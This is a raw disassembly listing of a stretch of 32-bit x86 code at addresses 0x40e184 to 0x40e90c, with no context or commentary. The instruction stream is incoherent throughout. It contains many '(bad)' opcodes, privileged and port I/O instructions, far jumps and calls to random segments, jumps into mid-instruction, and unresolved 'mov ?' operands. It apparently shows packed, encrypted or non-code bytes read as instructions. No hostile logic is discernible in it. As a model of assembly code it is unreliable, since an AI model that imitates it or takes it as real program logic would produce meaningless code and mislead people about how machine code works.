  40e184:	mov    al,ds:0x130c319e
  40e189:	sbb    al,0x0
  40e18b:	push   esi
  40e18c:	xchg   ebx,eax
  40e18d:	lock stos DWORD PTR es:[edi],eax
  40e18f:	fiadd  WORD PTR [esi+eiz*8-0x15]
  40e193:	sti    
  40e194:	sbb    al,0x50
  40e196:	rcr    DWORD PTR [ebp+eiz*4+0x12f6b15a],0x18
  40e19e:	(bad)  
  40e19f:	cli    
  40e1a0:	add    eax,0x4f23cbe5
  40e1a5:	div    BYTE PTR [edi+ebp*2+0x69]
  40e1a9:	mov    ecx,DWORD PTR [esi-0x36844e47]
  40e1af:	fs in  al,0x11
  40e1b2:	ret    
  40e1b3:	leave  
  40e1b4:	mov    ecx,0xca0b437
  40e1b9:	or     BYTE PTR ds:0xaf42a10,bh
  40e1bf:	dec    esi
  40e1c0:	(bad)  
  40e1c1:	fcomi  st,st(2)
  40e1c3:	icebp  
  40e1c4:	mov    esp,0x785a45fe
  40e1c9:	clc    
  40e1ca:	loop   0x40e1ba
  40e1cc:	dec    BYTE PTR [edi-0x69]
  40e1cf:	inc    ebx
  40e1d0:	cmp    al,0x9e
  40e1d2:	lahf   
  40e1d3:	and    al,0x92
  40e1d5:	sar    DWORD PTR [eax],0x5
  40e1d8:	sub    DWORD PTR [eax-0x4ca2d7e1],eax
  40e1de:	std    
  40e1df:	std    
  40e1e0:	ror    BYTE PTR [esi-0x32b52448],0x55
  40e1e7:	adc    eax,0x93eed408
  40e1ec:	jb     0x40e1a5
  40e1ee:	sub    ah,BYTE PTR [ebp-0x35]
  40e1f1:	loopne 0x40e1aa
  40e1f3:	and    al,0x40
  40e1f5:	inc    ebx
  40e1f6:	xor    DWORD PTR [ebp+0x47],ebp
  40e1f9:	push   ds
  40e1fa:	fs mov eax,0x12aec642
  40e200:	jne    0x40e267
  40e202:	fldenv [ebp-0x2]
  40e205:	ds cwde 
  40e207:	pop    edi
  40e208:	mov    ah,0x9d
  40e20a:	jae    0x40e22b
  40e20c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e20d:	jns    0x40e202
  40e20f:	and    al,0xb7
  40e211:	xor    edi,esi
  40e213:	mov    ds:0x8732f9b9,eax
  40e218:	std    
  40e219:	push   ds
  40e21a:	push   ebx
  40e21b:	mov    edi,0x6af311da
  40e220:	jae    0x40e25f
  40e222:	push   0x2e
  40e224:	retf   
  40e225:	fs iret 
  40e227:	xchg   esp,eax
  40e228:	xor    ebp,ecx
  40e22a:	mov    dh,0x22
  40e22c:	dec    eax
  40e22d:	aad    0x40
  40e22f:	not    DWORD PTR ds:0x77d7f0b9
  40e235:	mov    bl,0x5a
  40e237:	shl    BYTE PTR [eax],0xcb
  40e23a:	mov    edi,0xdf5ae4a6
  40e23f:	(bad)  
  40e240:	out    dx,eax
  40e241:	pop    esp
  40e242:	test   eax,0x6beb38fb
  40e247:	and    BYTE PTR [ebx+edx*1-0x2e],bl
  40e24b:	call   0x8f20d5b3
  40e250:	(bad)  
  40e251:	mov    dl,0xf9
  40e253:	jle    0xe6eff65f
  40e259:	std    
  40e25a:	pop    ecx
  40e25b:	ror    BYTE PTR [ebx-0x5b],0x41
  40e25f:	pop    eax
  40e260:	cwde   
  40e261:	sbb    eax,0x75594bd9
  40e266:	fisub  WORD PTR [ebx+esi*4+0x19]
  40e26a:	les    eax,FWORD PTR [ebp+ebx*1+0xa347a57]
  40e271:	adc    BYTE PTR [esi+0x204ef53],al
  40e277:	sbb    eax,0xca5d1b89
  40e27c:	dec    ebx
  40e27d:	outs   dx,BYTE PTR ds:[esi]
  40e27e:	mov    al,0xf4
  40e280:	jp     0x40e2b6
  40e282:	add    cl,dh
  40e284:	stos   BYTE PTR es:[edi],al
  40e285:	pop    esp
  40e286:	cmp    BYTE PTR [ebp+0x4],ah
  40e289:	pop    esi
  40e28a:	xchg   ebp,eax
  40e28b:	pop    ecx
  40e28c:	fadd   st,st(7)
  40e28e:	xchg   ecx,eax
  40e28f:	cmp    cl,cl
  40e291:	push   esp
  40e292:	in     al,0xe1
  40e294:	cwde   
  40e295:	mov    esi,0x84d9d070
  40e29a:	adc    esp,DWORD PTR [ecx+0x2]
  40e29d:	pop    ecx
  40e29e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e29f:	pop    ss
  40e2a0:	xchg   esp,eax
  40e2a1:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2a3:	xor    al,0xc5
  40e2a5:	scas   al,BYTE PTR es:[edi]
  40e2a6:	jno    0x40e313
  40e2a8:	popa   
  40e2a9:	pop    ds
  40e2aa:	pushw  es
  40e2ac:	mov    ecx,edi
  40e2ae:	cmp    al,al
  40e2b0:	and    esp,DWORD PTR [edi+0x7e]
  40e2b3:	int3   
  40e2b4:	xchg   DWORD PTR [edx+0x29f9620e],ebx
  40e2ba:	or     esi,DWORD PTR [ebx-0x19c05c4f]
  40e2c0:	stos   DWORD PTR es:[edi],eax
  40e2c1:	imul   edx,esi,0x48
  40e2c4:	cwde   
  40e2c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2c6:	test   DWORD PTR [edi-0x7236d63c],eax
  40e2cc:	pop    eax
  40e2cd:	and    ecx,DWORD PTR [ecx-0x70]
  40e2d0:	pop    ebx
  40e2d1:	pop    dx
  40e2d3:	in     eax,dx
  40e2d4:	les    ebx,FWORD PTR [ecx-0x32]
  40e2d7:	dec    edx
  40e2d8:	cmp    edx,DWORD PTR [edx+edi*4-0x2dc36b60]
  40e2df:	popa   
  40e2e0:	add    eax,0x56ff8ffc
  40e2e5:	mov    eax,0xc419af97
  40e2ea:	mov    ch,0x5a
  40e2ec:	or     dl,BYTE PTR [esi]
  40e2ee:	pop    edi
  40e2ef:	data16 daa 
  40e2f1:	out    0x8,eax
  40e2f3:	mov    esi,0x92586c5f
  40e2f8:	(bad)  
  40e2fa:	scas   al,BYTE PTR es:[edi]
  40e2fb:	and    al,0xc
  40e2fd:	adc    DWORD PTR [ebp-0x1761ae55],edx
  40e303:	leave  
  40e304:	cdq    
  40e305:	icebp  
  40e306:	je     0x40e2ec
  40e308:	pusha  
  40e309:	scas   eax,DWORD PTR es:[edi]
  40e30a:	jl     0x40e2d3
  40e30c:	sub    al,0x2
  40e30e:	lock pop ebp
  40e310:	add    ch,dh
  40e312:	mov    WORD PTR [esi],gs
  40e314:	and    al,0x2f
  40e316:	daa    
  40e317:	(bad)  
  40e318:	ficomp WORD PTR [esi+0x70]
  40e31b:	lock daa 
  40e31d:	jmp    0x40e329
  40e31f:	jmp    0xddb0:0x11ed65a
  40e326:	(bad)  
  40e327:	aad    0x9b
  40e329:	mov    dh,0x52
  40e32b:	pop    es
  40e32c:	pop    edi
  40e32d:	sahf   
  40e32e:	push   0x231b4271
  40e333:	mov    ecx,0xca351b3b
  40e338:	cld    
  40e339:	or     DWORD PTR [edi],eax
  40e33b:	mov    dh,0x2
  40e33d:	ja     0x40e34f
  40e33f:	(bad)  
  40e340:	mov    ds:0xc31db51,al
  40e345:	cmp    DWORD PTR ds:0x67249833,esp
  40e34b:	xlat   BYTE PTR ds:[ebx]
  40e34c:	fwait
  40e34d:	sbb    ecx,DWORD PTR [eax-0x54]
  40e350:	daa    
  40e351:	jl     0x40e387
  40e353:	popa   
  40e354:	shr    BYTE PTR [ecx-0x2faf12b],1
  40e35a:	dec    edx
  40e35b:	jo     0x40e35d
  40e35d:	stc    
  40e35e:	mov    al,ds:0x744a098b
  40e363:	fdivr  DWORD PTR [eax+0x4206af21]
  40e369:	test   al,0x77
  40e36b:	sar    esi,1
  40e36d:	popa   
  40e36e:	and    eax,0x360fa564
  40e373:	adc    cl,BYTE PTR [eax+0x5b]
  40e376:	or     BYTE PTR [edx+0x3f6deff9],cl
  40e37c:	sbb    DWORD PTR [edi-0x4a],esp
  40e37f:	sbb    eax,0xf4e1fb4e
  40e384:	stos   DWORD PTR es:[edi],eax
  40e385:	sub    al,0xdc
  40e387:	(bad)  
  40e389:	mov    ah,0x8c
  40e38b:	adc    eax,0x55cb9fe6
  40e390:	dec    esi
  40e391:	or     dh,ch
  40e393:	imul   ecx,DWORD PTR [edx],0xffffffe5
  40e396:	mov    al,0xd1
  40e398:	ss stc 
  40e39a:	cdq    
  40e39b:	iret   
  40e39c:	int    0xd7
  40e39e:	or     edi,DWORD PTR [edi+edi*2+0x18]
  40e3a2:	inc    DWORD PTR [edx+0x2c1af4c9]
  40e3a8:	sbb    eax,0x9c006e11
  40e3ad:	jns    0x40e3af
  40e3af:	test   eax,0xb5cdb99e
  40e3b4:	std    
  40e3b5:	cvtdq2ps xmm2,xmm1
  40e3b8:	ja     0x40e3ce
  40e3ba:	fisttp WORD PTR [esi]
  40e3bc:	sbb    BYTE PTR [eax-0x282dab8e],0xaa
  40e3c3:	push   edi
  40e3c4:	inc    eax
  40e3c5:	pop    eax
  40e3c6:	(bad)  
  40e3c7:	pop    ss
  40e3c8:	jg     0x40e43e
  40e3ca:	xchg   edi,eax
  40e3cb:	mov    ecx,0xa7ad5865
  40e3d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3d1:	jns    0x40e405
  40e3d3:	enter  0x12a0,0xcf
  40e3d7:	cmp    DWORD PTR [ecx+0x4e79f65a],0x1fb52665
  40e3e1:	stos   DWORD PTR es:[edi],eax
  40e3e2:	rcl    BYTE PTR [edx-0x37],1
  40e3e5:	cdq    
  40e3e6:	jmp    0xd354:0x8076cbcd
  40e3ed:	shl    DWORD PTR [ebx+0x48],cl
  40e3f0:	push   0x53
  40e3f2:	in     eax,0x94
  40e3f4:	mov    edi,0x9835337e
  40e3f9:	daa    
  40e3fa:	jbe    0x40e3cc
  40e3fc:	popf   
  40e3fd:	or     al,0x2b
  40e3ff:	mov    eax,ds:0xefafcb18
  40e404:	jnp    0x40e3bc
  40e406:	jae    0x40e395
  40e408:	arpl   WORD PTR [ebx],si
  40e40a:	push   esp
  40e40b:	cs popf 
  40e40d:	ficom  WORD PTR [eax-0x3b]
  40e410:	and    al,0xc8
  40e412:	mov    dl,0xd8
  40e414:	test   al,0x74
  40e416:	cld    
  40e417:	sub    edx,DWORD PTR [esi]
  40e419:	lods   eax,DWORD PTR ds:[esi]
  40e41a:	and    DWORD PTR [eax-0x44],esp
  40e41d:	mov    ch,0xa4
  40e41f:	sahf   
  40e420:	ret    0x34be
  40e423:	add    esp,ecx
  40e425:	sbb    DWORD PTR [ebx+0x4e],esp
  40e428:	gs out 0x6,al
  40e42b:	cmc    
  40e42c:	aad    0x9c
  40e42e:	xor    al,0xc3
  40e430:	jae    0x40e434
  40e432:	icebp  
  40e433:	dec    ebp
  40e434:	leave  
  40e435:	enter  0x770e,0xaa
  40e439:	xlat   BYTE PTR ds:[ebx]
  40e43a:	push   eax
  40e43b:	(bad)  [ebx+0x6e]
  40e43e:	xchg   ecx,eax
  40e43f:	inc    eax
  40e440:	mov    ebp,0xbc7804d3
  40e445:	cli    
  40e446:	add    BYTE PTR [ecx],0xfc
  40e449:	lds    ecx,FWORD PTR [eax+0x73]
  40e44c:	push   ebp
  40e44d:	mov    esi,0x120e24c3
  40e452:	jmp    0x3a1cac69
  40e457:	jno    0x40e412
  40e459:	das    
  40e45a:	inc    ebx
  40e45b:	and    cl,BYTE PTR [esi-0x8ecfbd6]
  40e461:	outs   dx,DWORD PTR ds:[esi]
  40e462:	mov    ebp,0x4c1c8095
  40e467:	push   ebx
  40e468:	adc    BYTE PTR [ebx-0x4d192b96],dh
  40e46e:	inc    edx
  40e46f:	jns    0x40e426
  40e471:	push   edi
  40e472:	xchg   esi,eax
  40e473:	mov    ecx,0x34efe2dd
  40e478:	or     DWORD PTR [esi+0x634500e0],edi
  40e47e:	lea    ebp,[ecx+eax*4-0x3]
  40e482:	sti    
  40e483:	xchg   edx,eax
  40e484:	mov    eax,0x5166b0ef
  40e489:	add    al,BYTE PTR [esi-0x78]
  40e48c:	sbb    eax,0x62bdf2c2
  40e491:	pop    ss
  40e492:	mov    ebx,0x8ca003cc
  40e497:	es inc eax
  40e499:	mov    eax,ds:0xc9298c32
  40e49e:	jae    0x40e46e
  40e4a0:	retf   
  40e4a1:	test   al,0x92
  40e4a3:	enter  0xba26,0x26
  40e4a7:	add    bh,BYTE PTR [edi]
  40e4a9:	mov    dh,0x6f
  40e4ab:	sub    cl,BYTE PTR [eax-0x21293f79]
  40e4b1:	bnd call 0xda940c4d
  40e4b7:	mov    edi,0x5eb2e779
  40e4bd:	loop   0x40e4fe
  40e4bf:	xor    DWORD PTR [ebx],ecx
  40e4c1:	jno    0x40e501
  40e4c3:	rcr    eax,cl
  40e4c5:	ror    DWORD PTR [eax+0x15],0x6d
  40e4c9:	sub    DWORD PTR [ebp+edi*8+0x2ca1b118],esi
  40e4d0:	xchg   esi,eax
  40e4d1:	jmp    0x40e467
  40e4d3:	mov    al,ds:0xac2a1bcf
  40e4d8:	std    
  40e4d9:	dec    esi
  40e4da:	pop    eax
  40e4db:	dec    esi
  40e4dc:	ret    0xa0b0
  40e4df:	push   edx
  40e4e0:	retf   0x2bd3
  40e4e3:	enter  0xdbba,0xd3
  40e4e7:	loopne 0x40e541
  40e4e9:	jbe    0x40e4d9
  40e4eb:	mov    eax,0x71b59a12
  40e4f0:	sti    
  40e4f1:	jmp    0xc3f8:0xd547a9ca
  40e4f8:	iret   
  40e4f9:	cmp    eax,0x3e7f913e
  40e4fe:	or     ecx,DWORD PTR [edx-0x48]
  40e501:	iret   
  40e502:	push   edx
  40e503:	int3   
  40e504:	arpl   WORD PTR [ecx+eiz*2-0x457f015e],cx
  40e50b:	inc    ecx
  40e50c:	stos   BYTE PTR es:[edi],al
  40e50d:	hlt    
  40e50e:	pop    esi
  40e50f:	sti    
  40e510:	pop    ebp
  40e511:	inc    eax
  40e512:	iret   
  40e513:	xor    eax,0x9159932c
  40e518:	mov    ebp,0x59e1dadd
  40e51d:	aas    
  40e51e:	retf   0x9abb
  40e521:	mov    al,0x8
  40e523:	sub    esi,DWORD PTR [ecx]
  40e525:	std    
  40e526:	mov    esi,0x6f1b4cca
  40e52b:	inc    esi
  40e52c:	mov    WORD PTR [ebx],gs
  40e52e:	or     al,0x41
  40e530:	aam    0x30
  40e532:	addr16 pop ds
  40e534:	push   0xffffffb0
  40e536:	cld    
  40e537:	cmp    DWORD PTR [eax+eax*1-0x1262ea44],ecx
  40e53e:	fiadd  DWORD PTR [ebx-0x54]
  40e541:	sbb    al,BYTE PTR ds:0x8c8214bc
  40e547:	dec    edx
  40e548:	sti    
  40e549:	mov    al,ds:0x65aff176
  40e54e:	retf   
  40e54f:	mov    ah,bl
  40e551:	cmp    DWORD PTR [esi],0x22dbd5e4
  40e557:	bound  esi,QWORD PTR ds:0xb9c93d50
  40e55d:	push   edx
  40e55e:	lods   eax,DWORD PTR ds:[esi]
  40e55f:	push   ss
  40e560:	out    dx,eax
  40e561:	sub    BYTE PTR [esi-0x80],cl
  40e564:	pop    edx
  40e565:	iret   
  40e566:	xchg   edx,eax
  40e567:	or     al,0xdc
  40e569:	and    BYTE PTR [edx+0x69a3e373],cl
  40e56f:	popf   
  40e570:	xor    edx,ecx
  40e572:	add    ecx,DWORD PTR [ebx+0x31]
  40e575:	pushf  
  40e576:	push   ebp
  40e577:	jnp    0x40e577
  40e579:	sub    BYTE PTR [edi+ecx*4-0x53],cl
  40e57d:	add    cl,BYTE PTR [ecx-0x1a09ca48]
  40e583:	sbb    edx,DWORD PTR [edx+0x28]
  40e586:	and    eax,0xb59c1f42
  40e58b:	loop   0x40e52d
  40e58d:	mov    bh,0xfd
  40e58f:	mul    DWORD PTR [ebx-0x4e]
  40e592:	das    
  40e593:	mov    eax,ds:0x34445acc
  40e598:	js     0x40e5fb
  40e59a:	sub    esp,eax
  40e59c:	jmp    0x40e60f
  40e59e:	pushf  
  40e59f:	jb     0x40e5aa
  40e5a1:	in     eax,0x6a
  40e5a3:	jbe    0x40e55c
  40e5a5:	xchg   ebp,eax
  40e5a6:	mov    al,ds:0x7f3d6981
  40e5ab:	test   al,0x3
  40e5ad:	call   0x14f3:0xda0c627
  40e5b4:	iret   
  40e5b5:	push   ss
  40e5b6:	iret   
  40e5b7:	add    al,0x86
  40e5b9:	lock pop es
  40e5bb:	jno    0x40e5a9
  40e5bd:	push   ds
  40e5be:	mov    ch,0x15
  40e5c0:	mov    cl,0x64
  40e5c2:	xchg   esi,eax
  40e5c3:	fmul   QWORD PTR [esi-0x687d58b9]
  40e5c9:	and    dl,BYTE PTR ds:0x1979718f
  40e5cf:	or     bl,al
  40e5d1:	sbb    dl,BYTE PTR [esi-0x137f350f]
  40e5d7:	popa   
  40e5d8:	sti    
  40e5d9:	jecxz  0x40e5c0
  40e5db:	into   
  40e5dc:	sub    ch,BYTE PTR [edx-0x5d]
  40e5df:	cmp    edx,edi
  40e5e1:	(bad)  
  40e5e2:	push   0x39
  40e5e4:	jne    0x40e61d
  40e5e6:	sar    BYTE PTR [ecx],0xb8
  40e5e9:	mov    cl,0xeb
  40e5eb:	and    al,0x68
  40e5ed:	mov    edx,0x713b1889
  40e5f2:	repz jl 0x40e65c
  40e5f5:	xchg   sp,ax
  40e5f7:	xor    edx,DWORD PTR [ebp+0x1b3e3f39]
  40e5fd:	hlt    
  40e5fe:	jecxz  0x40e671
  40e600:	inc    esi
  40e601:	pop    ebx
  40e602:	loop   0x40e5ba
  40e604:	push   0x70
  40e606:	gs ret 0xacfe
  40e60a:	sti    
  40e60b:	inc    esi
  40e60c:	sbb    dl,ah
  40e60e:	dec    ebp
  40e60f:	xor    edi,ebp
  40e611:	xchg   BYTE PTR [edi+0x51996a72],al
  40e617:	push   ebp
  40e618:	dec    esp
  40e619:	xchg   BYTE PTR [esi-0x36789878],ah
  40e61f:	xchg   ebp,eax
  40e620:	mov    bh,0x34
  40e622:	adc    eax,ebp
  40e624:	int    0xe1
  40e626:	adc    al,0x7f
  40e628:	out    dx,al
  40e629:	shr    DWORD PTR [edi+edi*2-0x21cb73c4],1
  40e630:	or     al,0xe8
  40e632:	xchg   esi,eax
  40e633:	iret   
  40e634:	xor    al,0x58
  40e636:	std    
  40e637:	jmp    0x40e62d
  40e639:	and    eax,DWORD PTR [edi]
  40e63b:	bound  edx,QWORD PTR [ebx-0x26]
  40e63e:	mov    edi,0x4a8aeaec
  40e643:	adc    eax,0x5631d099
  40e648:	jmp    0x40e614
  40e64a:	cdq    
  40e64b:	lods   al,BYTE PTR ds:[esi]
  40e64c:	(bad)  
  40e64d:	jl     0x40e659
  40e64f:	ror    DWORD PTR [edi+0xc915094],1
  40e655:	jbe    0x40e6c6
  40e657:	aas    
  40e658:	pop    esp
  40e659:	dec    esp
  40e65a:	inc    esi
  40e65b:	xchg   edx,eax
  40e65c:	jecxz  0x40e5f5
  40e65e:	loopne 0x40e6be
  40e660:	inc    ecx
  40e661:	add    ebx,edx
  40e663:	dec    ebp
  40e664:	add    ecx,DWORD PTR [esi+eax*1]
  40e667:	lock mov dl,0xca
  40e66a:	pop    DWORD PTR [edx+0xc1bbdd7]
  40e670:	pop    ecx
  40e671:	xor    eax,0x59902456
  40e676:	mov    cl,0xab
  40e678:	push   eax
  40e679:	shr    BYTE PTR [ecx-0x45],0x35
  40e67d:	fisub  DWORD PTR [esi+0x72]
  40e680:	fwait
  40e681:	fs enter 0x7463,0x7f
  40e686:	xchg   edx,eax
  40e687:	in     al,dx
  40e688:	daa    
  40e689:	mov    eax,0x30c97831
  40e68e:	sub    eax,0x5372fa52
  40e693:	jp     0x40e692
  40e695:	mov    ?,WORD PTR [eax]
  40e697:	cli    
  40e698:	xor    DWORD PTR [edi],0xffffffd7
  40e69b:	sbb    al,0x18
  40e69d:	or     eax,0xa213a9fe
  40e6a2:	xchg   esp,eax
  40e6a3:	int    0x3e
  40e6a5:	jle    0x40e64a
  40e6a7:	mov    cl,0xa5
  40e6a9:	call   0x863d:0x85afbf77
  40e6b0:	ins    BYTE PTR es:[edi],dx
  40e6b1:	or     al,0x5b
  40e6b3:	sahf   
  40e6b4:	pop    ss
  40e6b5:	mov    al,0x32
  40e6b7:	test   DWORD PTR [ebx],edx
  40e6b9:	call   0xb204:0x839a6e6c
  40e6c0:	ins    DWORD PTR es:[edi],dx
  40e6c1:	cmp    BYTE PTR [ebp+esi*2+0x30ef08f2],0x67
  40e6c9:	dec    esp
  40e6ca:	nop
  40e6cb:	stos   BYTE PTR es:[edi],al
  40e6cc:	push   ebp
  40e6cd:	jecxz  0x40e70a
  40e6cf:	jbe    0x40e74a
  40e6d1:	sbb    ch,bh
  40e6d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6d4:	or     al,0x2e
  40e6d6:	(bad)  
  40e6d7:	pop    ss
  40e6d8:	sub    ebx,DWORD PTR [ebx-0x49e58403]
  40e6de:	push   ss
  40e6df:	push   edx
  40e6e0:	mov    eax,0xffcf4f6d
  40e6e5:	jae    0x40e758
  40e6e7:	int    0x76
  40e6e9:	out    dx,al
  40e6ea:	and    BYTE PTR [edx-0x3e],ch
  40e6ed:	je     0x40e6d4
  40e6ef:	mov    al,0x31
  40e6f1:	pop    ecx
  40e6f2:	dec    esi
  40e6f3:	lods   al,BYTE PTR ds:[esi]
  40e6f4:	pop    es
  40e6f5:	ds mov ecx,0x6a930a11
  40e6fb:	jno    0x40e723
  40e6fd:	adc    DWORD PTR [eax],0xffffffa6
  40e700:	neg    ah
  40e702:	jp     0x40e723
  40e704:	xor    ch,dl
  40e706:	cmp    ebp,DWORD PTR [ecx+ebp*8]
  40e709:	dec    esp
  40e70a:	pop    esi
  40e70b:	mov    ebp,0x42c12e96
  40e710:	push   ecx
  40e711:	bound  ecx,QWORD PTR [ebp-0x5394097c]
  40e717:	xlat   BYTE PTR ds:[ebx]
  40e718:	xchg   DWORD PTR [eax],edx
  40e71a:	js     0x40e6e0
  40e71c:	mov    al,ds:0x236d4ec8
  40e721:	mov    ch,0xd2
  40e723:	cmp    al,dl
  40e725:	push   edi
  40e726:	stc    
  40e727:	jno    0x40e6ec
  40e729:	mov    ds:0x75ee27ac,eax
  40e72e:	or     BYTE PTR [eax-0x696e9a2d],dl
  40e734:	fstp   DWORD PTR ds:0x1f441b7c
  40e73a:	sub    dl,BYTE PTR [edx-0x2b401fc6]
  40e740:	outs   dx,BYTE PTR ds:[esi]
  40e741:	pop    esp
  40e742:	dec    ecx
  40e743:	mov    ecx,0x9be05bad
  40e748:	dec    edx
  40e749:	mov    ah,0x71
  40e74b:	in     al,dx
  40e74c:	test   al,0x65
  40e74e:	adc    al,0x8e
  40e750:	(bad)  
  40e751:	inc    edx
  40e752:	sub    DWORD PTR [edx+0x28],ecx
  40e755:	je     0x40e77e
  40e757:	jle    0x40e7bd
  40e759:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e75a:	push   esp
  40e75b:	in     al,0xd4
  40e75d:	or     al,0x79
  40e75f:	push   esi
  40e760:	(bad)  
  40e761:	sar    edi,cl
  40e763:	les    ebx,FWORD PTR [ebx]
  40e765:	dec    esi
  40e766:	(bad)  
  40e768:	loop   0x40e7ca
  40e76a:	shl    DWORD PTR ds:0xf612eb4c,1
  40e770:	je     0x40e6f7
  40e772:	outs   dx,DWORD PTR gs:[esi]
  40e774:	push   ss
  40e775:	inc    edx
  40e776:	dec    esp
  40e777:	and    esi,eax
  40e779:	cmp    ebp,esi
  40e77b:	push   0xc3594f90
  40e780:	ficom  DWORD PTR [ebp+edi*1-0x3e]
  40e784:	retf   
  40e785:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e786:	add    esp,DWORD PTR [esi]
  40e788:	jo     0x40e805
  40e78a:	push   0x5
  40e78c:	and    esi,esp
  40e78e:	jmp    0xdc66:0xa7638b03
  40e795:	mov    bl,0x5c
  40e797:	test   eax,0x855c808b
  40e79c:	rcr    BYTE PTR [ebx],0xb8
  40e79f:	sub    ecx,edx
  40e7a1:	fdivr  DWORD PTR [ebx]
  40e7a3:	fidiv  WORD PTR [eax+0x7f16f388]
  40e7a9:	call   0x1a6:0x43bcb445
  40e7b0:	push   ecx
  40e7b1:	xchg   esi,eax
  40e7b2:	pop    DWORD PTR [esi+0x294fc54e]
  40e7b8:	das    
  40e7b9:	ss mov al,0xd1
  40e7bc:	xchg   esi,eax
  40e7bd:	pop    ds
  40e7be:	scas   al,BYTE PTR es:[edi]
  40e7bf:	pop    es
  40e7c0:	ins    BYTE PTR es:[edi],dx
  40e7c1:	sbb    al,0x51
  40e7c3:	cmc    
  40e7c4:	mov    dh,ah
  40e7c6:	dec    ebp
  40e7c7:	mov    ?,WORD PTR [ebx+0x1e]
  40e7ca:	xchg   ebp,eax
  40e7cb:	jmp    0xfbb45054
  40e7d0:	jb     0x40e7fc
  40e7d2:	sar    BYTE PTR [edx-0x60265dd7],1
  40e7d8:	xor    eax,edx
  40e7da:	test   al,0x31
  40e7dc:	cmp    eax,0xc668879d
  40e7e1:	jge    0x40e82c
  40e7e3:	je     0x40e7d1
  40e7e5:	lods   eax,DWORD PTR ds:[esi]
  40e7e6:	adc    eax,0x5f157e88
  40e7eb:	jo     0x40e84e
  40e7ed:	inc    edx
  40e7ee:	clc    
  40e7ef:	cli    
  40e7f0:	add    al,0x3c
  40e7f2:	and    DWORD PTR [ebp+0x3a2973dc],ebx
  40e7f8:	or     DWORD PTR [edi-0x46],ecx
  40e7fb:	loop   0x40e7ee
  40e7fd:	dec    ebp
  40e7fe:	xor    DWORD PTR [eax+0x19],ecx
  40e801:	mov    eax,0x7524b485
  40e806:	scas   eax,DWORD PTR es:[edi]
  40e807:	push   ebx
  40e808:	mov    al,ds:0x23db33e4
  40e80d:	and    BYTE PTR [eiz*8-0x3314720e],dh
  40e814:	sbb    al,0xa3
  40e816:	lahf   
  40e817:	popf   
  40e818:	mov    ebx,0x6aad1a39
  40e81d:	imul   edi,esi,0xf
  40e820:	sub    al,BYTE PTR [esi]
  40e822:	in     al,dx
  40e823:	imul   eax
  40e825:	and    DWORD PTR [ecx+0x58340d13],edi
  40e82b:	or     DWORD PTR [esi-0x6969aa7e],ebx
  40e831:	add    al,0x8a
  40e833:	inc    edi
  40e834:	(bad)  
  40e835:	fiadd  DWORD PTR ds:0x635c9ce6
  40e83b:	mov    eax,0xb5b49650
  40e840:	ja     0x40e7d6
  40e842:	(bad)
  40e845:	push   es
  40e846:	out    0xf4,al
  40e848:	adc    eax,0x7fc3e37d
  40e84d:	pop    edx
  40e84e:	jp     0x40e88b
  40e850:	mov    eax,0xd1208efe
  40e855:	test   al,0xa4
  40e857:	adc    BYTE PTR [edx+0x29],ah
  40e85a:	xor    al,0x51
  40e85c:	aas    
  40e85d:	xchg   BYTE PTR [esi],dh
  40e85f:	add    BYTE PTR [edx-0x67],ch
  40e862:	je     0x40e8dc
  40e864:	jmp    0x40e8d8
  40e866:	(bad)  
  40e867:	mov    ch,0xb4
  40e869:	repnz (bad) 
  40e86b:	outs   dx,BYTE PTR ds:[esi]
  40e86c:	cmp    DWORD PTR [ebp+0x14],esi
  40e86f:	bound  eax,QWORD PTR [eax+eiz*2+0x65]
  40e873:	push   cs
  40e874:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e875:	lds    eax,FWORD PTR [ebp-0x633cb6b4]
  40e87b:	les    ebp,FWORD PTR [edx]
  40e87d:	cmp    al,0x3d
  40e87f:	dec    esi
  40e880:	jmp    0x40e81c
  40e882:	arpl   WORD PTR [edx],si
  40e884:	adc    al,0x48
  40e886:	xchg   ecx,eax
  40e887:	pop    ecx
  40e888:	mov    ds:0xea3f813,eax
  40e88d:	add    edx,DWORD PTR ds:0xfd5ec334
  40e893:	ror    bh,1
  40e895:	mov    esi,0xfd8e0d7
  40e89a:	xchg   edx,eax
  40e89b:	div    BYTE PTR [edi+0x53e5d4a0]
  40e8a1:	imul   BYTE PTR es:[edi]
  40e8a4:	cmp    eax,0x577dd554
  40e8a9:	pusha  
  40e8aa:	mov    al,ds:0xa50406a8
  40e8af:	xor    eax,0xf8714661
  40e8b4:	fnstsw WORD PTR [edi]
  40e8b6:	cld    
  40e8b7:	add    eax,0x4d708788
  40e8bc:	push   ecx
  40e8bd:	shl    BYTE PTR ss:[esi-0x5d],0x1e
  40e8c2:	cmp    dl,BYTE PTR [edi-0x642be93d]
  40e8c8:	xchg   esp,eax
  40e8c9:	push   ebx
  40e8ca:	mov    ebp,0xfc832ccb
  40e8cf:	in     al,dx
  40e8d0:	popf   
  40e8d1:	dec    edx
  40e8d2:	add    al,0x19
  40e8d4:	shr    BYTE PTR [edi],cl
  40e8d6:	sbb    ch,al
  40e8d8:	(bad)  
  40e8d9:	dec    eax
  40e8da:	(bad)  
  40e8db:	push   esp
  40e8dc:	dec    ebp
  40e8dd:	cmp    eax,0x18fa64a5
  40e8e2:	arpl   WORD PTR [edx],sp
  40e8e4:	push   ss
  40e8e5:	retf   
  40e8e6:	retf   0xeabb
  40e8e9:	push   eax
  40e8ea:	outs   dx,BYTE PTR ds:[esi]
  40e8eb:	pop    esp
  40e8ec:	jns    0x40e922
  40e8ee:	sahf   
  40e8ef:	icebp  
  40e8f0:	dec    edi
  40e8f1:	adc    BYTE PTR [ecx+0x47],dh
  40e8f4:	loopne 0x40e96c
  40e8f6:	push   0x41
  40e8f8:	sbb    BYTE PTR [ecx+0x26026d15],0x3d
  40e8ff:	loop   0x40e8df
  40e901:	xchg   esi,eax
  40e902:	scas   eax,DWORD PTR es:[edi]
  40e903:	sbb    al,0x54
  40e905:	shl    BYTE PTR [esi],1
  40e907:	and    ecx,ebp
  40e909:	xchg   ebp,eax
  40e90a:	dec    ebx
  40e90b:	push   cs
  40e90c:	fdivr  DWORD PTR [esi-0x5e]
